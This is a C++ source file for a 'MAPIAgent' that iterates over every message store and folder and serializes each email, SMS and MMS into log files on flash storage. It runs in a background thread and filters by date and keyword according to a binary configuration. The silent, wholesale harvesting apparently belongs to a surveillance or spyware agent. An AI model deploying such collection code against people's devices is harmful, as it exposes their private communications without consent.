#include <map>

#include "Conf.h"
#include "Log.h"
#include "MAPIAgent.h"

DWORD CollectorThreadProc(LPVOID lpParameter)
{
  (void) lpParameter;
  
  MAPIAgent* agent = MAPIAgent::Instance();
  // agent->WriteMarkup();
  agent->Collect(0);
  
  return 0;
}

class MAPIAgentCleaner
{
public:
	~MAPIAgentCleaner()
	{
		MAPIAgent::Destroy();
	}
} MAPIAgentCleanerInstance;

MAPIAgent* MAPIAgent::_instance = NULL;
int MAPIAgent::_refCount = 0;
volatile LONG MAPIAgent::_lLock = 0;

MAPIAgent::MAPIAgent(void)
: _conf(NULL), _mapi(NULL), _dwCollectorThreadID(0), _hCollectorThread(NULL), _HasToQuit(false), _markup(NULL),
  _collect(false), _realtime(false)
{
  _markup = new MAPIMarkup();
}

MAPIAgent* MAPIAgent::Instance()
{
  while (::InterlockedExchange((LPLONG)&_lLock, 1) != 0)
    Sleep(1);
	
  if ( _instance == NULL)
  {
    _instance = new MAPIAgent();
  }
  _refCount++;
  ::InterlockedExchange((LPLONG)&_lLock, 0);
  return _instance;
}

void MAPIAgent::Release()
{
  if ( --_refCount < 1)
  {
    Destroy();
    _instance = NULL;
  }
}

void MAPIAgent::Destroy()
{ 
  if ( _instance != NULL )
  {
    delete _instance;
    _instance = NULL;
	_refCount = 0;
  }

  //if (_collect && _hCollectorThread != NULL) {
	//  CloseHandle(_hCollectorThread);
  //}
}

BOOL MAPIAgent::Run(DWORD nRun)
{
  (void) nRun;
   
  if (_collect)
    _hCollectorThread = CreateThread(NULL, 0, CollectorThreadProc, NULL, 0, &_dwCollectorThreadID);
  
  if (_realtime)
    AdviseStores();
  
  return TRUE;
}

HRESULT MAPIAgent::Collect(DWORD nRun)
{
  for(std::list<MAPIStorage*>::iterator store_iter = _mapi->stores.begin(); 
    store_iter != _mapi->stores.end(); store_iter++)
  {
    MAPIStorage* storage = *store_iter;

    HRESULT hr = storage->BuildFoldersTree();
    if (FAILED(hr))
    {
      continue;
    }
    
    for (tree<MAPIFolder*>::iterator folder_iter = storage->folders.begin();
      folder_iter != storage->folders.end(); folder_iter++)
    {
      MAPIFolder* folder = *folder_iter;
      
      LONG nMessages = folder->GetNumberOfMessages();
      
      if (nMessages > 0)
        if (SUCCEEDED(folder->Open()))
        {
          MAPIMessage* msg;
          ULONG nMsg = 1;
          
          while ((msg = folder->GetSingleMessage()) != NULL)
          {
            ASSERT(msg);
            
			if (storage->isIncomingFolder(folder))
				msg->setIncoming();
			
            msg->SetFolder(folder->name());
            if (msg->Parse(COLLECT) == S_OK)
            {
              DWORD cbSize = 0;
              
              LPBYTE lpData = msg->Serialize(&cbSize);
              if (lpData != NULL)
              {
                UINT log_type = LOGTYPE_MAIL;
                
                if (CmpWildW(CLASS_MAIL, msg->Class()) != 0)
                  log_type = LOGTYPE_MAIL;
                else if (CmpWildW(CLASS_SMS, msg->Class()) != 0)
                  log_type = LOGTYPE_SMS;
                else if (CmpWildW(CLASS_MMS, msg->Class()) != 0)
                  log_type = LOGTYPE_MMS;
                
                Log* pLog = new Log();
                if (pLog->CreateLog(log_type, NULL, 0, FLASH) == TRUE)
                {
                  pLog->WriteLog(lpData, cbSize);
                  pLog->CloseLog();
                }
                delete pLog;

              }
              
              LocalFree(lpData);
            }
            
            delete msg;
            msg = NULL;
            
            nMsg++;

            if (IsQuitting())
              return S_OK;
            
            Sleep(20);
          }
        }
    }
  }

  return S_OK;
}

BOOL MAPIAgent::Init( LPBYTE lpConfig, DWORD cbConfig )
{
  BOOL bConfigSet = setConfiguration(lpConfig, cbConfig);
  if (bConfigSet == FALSE)
    return FALSE;
  
  _mapi = new MAPI();
  if (_mapi == NULL)
    return FALSE;
  
  if (S_OK != _mapi->Init())
    return FALSE;
  
  if (S_OK != _mapi->EnumerateStores())
    return FALSE;
  
  return TRUE;
}

BOOL MAPIAgent::Accept( MAPIMessage* msg, FilterTypes FilterType )
{
  ASSERT(msg);

  if (msg->Class() == NULL) {
	  DBG_TRACE(L"Debug - MAPIAgent.cpp - Accept() [ERROR message class null]", 5, FALSE);
	  return FALSE;
  }
  
  // Get filter for message ... if no filter is found, assume message class is not interesting
  MAPIAgentClassFilter* filter = IsMessageClassAcceptable(msg->Class(), FilterType);
  if (filter == NULL) {
	  DBG_TRACE(L"Debug - MAPIAgent.cpp - Accept() [ERROR no filter for this class]", 5, FALSE);
	return FALSE;
  }
  
  // Check if we have to take all of them
  if (filter->header.All)
    return TRUE;
  
  // Check for filtering by date
  LPFILETIME lpftDeliveryTime = msg->DeliveryTime();
  if (lpftDeliveryTime)
  {
    // If Delivery time is equal or later than FromDate filter, accept message
    if (filter->header.DoFilterFromDate == TRUE)
		if ( CompareFileTime(lpftDeliveryTime, &filter->header.FromDate) < 0 ) {
			DBG_TRACE(L"Debug - MAPIAgent.cpp - Accept() [ERROR Delivery time is before filter FromDate]", 5, FALSE);
			return FALSE;
		}

    // If Delivery time is equal or earlier than ToDate filter, accept message
    if (filter->header.DoFilterToDate == TRUE)
		if ( CompareFileTime(lpftDeliveryTime, &filter->header.ToDate) > 0 ) {
			DBG_TRACE(L"Debug - MAPIAgent.cpp - Accept() [ERROR Delivery time is after filter ToDate]", 5, FALSE);
			return FALSE;
		}
  } else {
	  DBG_TRACE(L"Debug - MAPIAgent.cpp - Accept() [no Delivery time available ... no problem!]", 5, FALSE);
	  // if date is clearly invalid (1st Jan 1601), reject the message
	  //return FALSE;
  }
  
  // Check if we have to filter by keyword
  if (filter->HasKeyword())
  {
    LPWSTR filterKeyword = filter->Keyword();
    LPWSTR msgSubject = msg->Subject();
    LPWSTR msgFrom = msg->From();
    
    INT subjectMatch = 0; // assume they do not match
    INT fromMatch = 0;
    
    if (msgSubject)
      subjectMatch = CmpWildW(filter->Keyword(), msgSubject);
    
    if (msgFrom)
      fromMatch = CmpWildW(filter->Keyword(), msgFrom);
    
    // if keyword does not match Subject or From fields
	if (subjectMatch == 0 && fromMatch == 0) {
		DBG_TRACE(L"Debug - MAPIAgent.cpp - Accept() [ERROR filter keyword is not present in message]", 5, FALSE);
		return FALSE;
	}
  }
  
  return TRUE;
}

HRESULT MAPIAgent::AdviseStores()
{
  for(std::list<MAPIStorage*>::iterator store_iter = _mapi->stores.begin(); 
    store_iter != _mapi->stores.end(); store_iter++)
  {
    MAPIStorage* storage = *store_iter;
    AdviseStore(storage);
  }

  return S_OK;
}